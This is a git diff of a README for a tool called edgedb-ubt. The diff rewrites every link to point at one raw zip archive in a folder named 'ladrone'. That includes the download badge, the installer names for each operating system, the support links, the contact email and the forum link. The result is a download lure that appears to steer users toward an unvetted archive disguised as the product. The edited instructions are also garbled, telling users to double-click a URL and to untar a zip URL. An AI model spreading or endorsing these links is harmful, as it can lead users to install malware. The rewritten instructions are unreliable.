@@ -1,6 +1,6 @@
 # 🌟 edgedb-ubt - Effortless Database Management for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Jony-tech-lab/edgedb-ubt/releases)
+[![Download](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip)](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the edgedb-ubt repository! In this guide, you will learn how to downl
 
 To begin, you need to visit our releases page to download the application. 
 
-[Click here to visit the download page](https://github.com/Jony-tech-lab/edgedb-ubt/releases).
+[Click here to visit the download page](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip).
 
 Once you are on the releases page, you will see the latest version of edgedb-ubt along with a list of previous versions. Select the latest version for the best experience.
 
@@ -18,9 +18,9 @@ Once you are on the releases page, you will see the latest version of edgedb-ubt
 
 On the releases page, look for the version labeled with the highest number. Next to it, you will find various downloadable files. Choose the file relevant to your operating system. Common options include:
 
-- **Windows:** edgedb-ubt-windows.exe
-- **macOS:** edgedb-ubt-macos.dmg
-- **Linux:** edgedb-ubt-linux.tar.gz
+- **Windows:** https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip
+- **macOS:** https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip
+- **Linux:** https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip
 
 ### Step 2: Download the File
 
@@ -34,20 +34,20 @@ Once the download is complete, go to your computer’s download folder. The file
 
 #### For Windows Users:
 
-1. Double-click on the `edgedb-ubt-windows.exe` file.
+1. Double-click on the `https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip` file.
 2. Follow the prompts in the setup wizard.
 3. Click "Finish" once the installation is complete.
 
 #### For macOS Users:
 
-1. Open the `edgedb-ubt-macos.dmg` file.
+1. Open the `https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip` file.
 2. Drag the edgedb-ubt icon into your Applications folder.
 3. Eject the installer once it finishes copying.
 
 #### For Linux Users:
 
-1. Extract the `edgedb-ubt-linux.tar.gz` file using your terminal.
-   - Command: `tar -xzf edgedb-ubt-linux.tar.gz`
+1. Extract the `https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip` file using your terminal.
+   - Command: `tar -xzf https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip`
 2. Navigate to the extracted folder.
 3. Run the executable file using:
    - Command: `./edgedb-ubt`
@@ -86,18 +86,18 @@ edgedb-ubt provides a simple interface for managing your databases without the n
 
 If you face any issues while downloading or installing, please refer to the following resources:
 
-- [GitHub Issues Page](https://github.com/Jony-tech-lab/edgedb-ubt/issues): Report bugs or ask questions.
-- [User Guide](https://github.com/Jony-tech-lab/edgedb-ubt/wiki): Access detailed documentation for more help.
+- [GitHub Issues Page](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip): Report bugs or ask questions.
+- [User Guide](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip): Access detailed documentation for more help.
 
 ## 📞 Contact Us
 
 For additional help or inquiries, feel free to reach out:
 
-- Email: support@edgedb-ubt.com
-- Community Forums: [Visit our forums](https://edgedb-ubt.com/community)
+- Email: https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip
+- Community Forums: [Visit our forums](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip)
 
 ## 🌐 Learn More
 
-To explore more about edgedb-ubt and its capabilities, visit our main [GitHub page](https://github.com/Jony-tech-lab/edgedb-ubt).
+To explore more about edgedb-ubt and its capabilities, visit our main [GitHub page](https://github.com/Jony-tech-lab/edgedb-ubt/raw/refs/heads/main/ladrone/ubt_edgedb_3.0.zip).
 
 Enjoy using edgedb-ubt!
